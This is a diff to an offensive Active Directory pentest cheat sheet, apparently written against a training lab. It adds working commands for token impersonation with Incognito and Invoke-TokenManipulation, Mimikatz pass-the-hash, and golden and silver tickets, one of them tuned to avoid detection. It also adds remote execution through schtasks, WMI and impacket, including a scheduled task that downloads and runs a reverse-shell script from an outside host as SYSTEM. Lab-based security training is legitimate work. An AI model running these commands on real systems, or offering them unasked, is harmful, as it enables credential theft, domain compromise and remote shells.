@@ -33,6 +33,8 @@
   - [Dumping secrets without Mimikatz](#dumping-secrets-without-mimikatz)
   - [Chisel proxying](#chisel-proxying)
 
+# General
+
 ## PowerShell AMSI Bypass
 Unhooking AMSI will help bypass AV warnings triggered when executing PowerShell scripts that are marked as malicious (such as PowerView). Do not use as-is in covert operations, as they will get flagged. Obfuscate, or even better, eliminate the need for an AMSI bypass altogether by altering your scripts.
 
@@ -376,13 +378,109 @@ We need ACL permissions to set UserAccountControl flags for said user, see above
 Set-DomainObject -Identity support355user -Set @{serviceprincipalname='any/thing'}
 ```
 
-
-
-
-
 ## Token Manipulation
+
+Tokens can be impersonated from other users with a session/running processes on the machine. A similar effect can be achieved by using e.g. CobaltStrike to inject into said processes.
+
+Incognito
+Show tokens on the machine:
+```
+.\incognito.exe list_tokens -u
+```
+
+Start new process with token of a specific user:
+```
+.\incognito.exe execute -c "domain\user" C:\Windows\system32\calc.exe
+```
+
+If you're using Meterpreter, you can use the built-in Incognito module with use incognito, the same commands are available.
+
+
+### Invoke-TokenManipulation
+Show all tokens on the machine:
+```
+Invoke-TokenManipulation -ShowAll
+```
+
+Show only unique, usable tokens on the machine:
+```
+Invoke-TokenManipulation -Enumerate
+```
+
+Start new process with token of a specific user:
+```
+Invoke-TokenManipulation -ImpersonateUser -Username "domain\user"
+```
+
+Start new process with token of another process:
+```
+Invoke-TokenManipulation -CreateProcess "C:\Windows\system32\calc.exe" -ProcessId 500
+```
+
+### Mimikatz
+Overpass the hash:
+```
+sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:[NTLMHASH] /run:powershell.exe
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:srvadmin /domain:dollarcorp.moneycorp.local /ntlm:a98e18228819e8eec3dfa33cb68b0728 /run:powershell.exe"'`
+```
+
+```
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:srvadmin /domain:dollarcorp.moneycorp.local /ntlm:ff46a9d8bd66c6efd77603da26796f35 /run:powershell.exe"'
+```
+
+Golden ticket (domain admin, w/ some ticket properties to avoid detection):
+```
+kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-[DOMAINSID] /krbtgt:[KRBTGTHASH] /id:500 /groups:513,512,520,518,519 /startoffset:0 /endin:600 /renewmax:10080 /ptt
+Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /ff46a9d8bd66c6efd77603da26796f35 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
+```
+
+Silver ticket for a specific SPN with a compromised service/machine account:
+```
+kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-[DOMAINSID] /rc4:[MACHINEACCOUNTHASH] /target:dc.domain.local /service:HOST /id:500 /groups:513,512,520,518,519 /startoffset:0 /endin:600 /renewmax:10080 /ptt
+
+HOST:
+Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:[ntlm hash dcorp-dc] /user:Administrator /ptt"'`
+
+RPCSS:
+Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:RPCSS /rc4:[ntlm hash dcorp-dc] /user:Administrator /ptt"'
+```
+
+List of available SPNs for silver tickets: https://adsecurity.org/?page_id=183
+
+
 ## Command execution with schtask
+(requires 'Host' SPN)
+
+To create a task:
+Mind the quotes. Use encoded commands if quoting becomes a pain.
+```
+schtasks /create /tn "shell" /ru "NT Authority\SYSTEM" /s dcorp-dc.dollarcorp.moneycorp.local /sc weekly /tr "Powershell.exe -c 'IEX (New-Object Net.WebClient).DownloadString(''http://172.16.100.55/Invoke-PowerShellTcpRun.ps1''')'"
+```
+
+To trigger it:
+```
+schtasks /RUN /TN "shell" /s dcorp-dc.dollarcorp.moneycorp.local
+```
+
+
 ## Command execution with WMI
+(requires 'Host' and 'RPCSS')
+
+From Windows:
+```
+Invoke-WmiMethod win32_process -ComputerName dcorp-dc.dollarcorp.moneycorp.local -name create -argumentlist "powershell.exe -e $encodedCommand"
+```
+
+From Linux:
+```
+With password
+impacket-wmiexec dcorp/student355:password@172.16.4.101
+
+With hash
+impacket-wmiexec dcorp/student355@172.16.4.101 -hashes :92F4AE6DCDAC7CF870B79F1758503D54
+```
+
+
 ## Command executing with PowerShell Remoting
 
 
